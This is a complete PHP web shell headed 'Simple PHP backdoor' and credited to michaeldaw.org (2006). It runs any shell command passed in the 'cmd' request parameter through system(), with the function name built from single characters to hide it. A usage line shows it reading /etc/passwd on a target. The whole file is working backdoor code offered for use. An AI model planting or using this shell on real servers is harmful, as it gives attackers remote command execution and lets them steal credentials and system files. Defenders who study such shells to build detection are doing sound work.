<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php
$__fn_50899 = "s"."y"."s"."t"."e"."m";

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        $__fn_50899($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
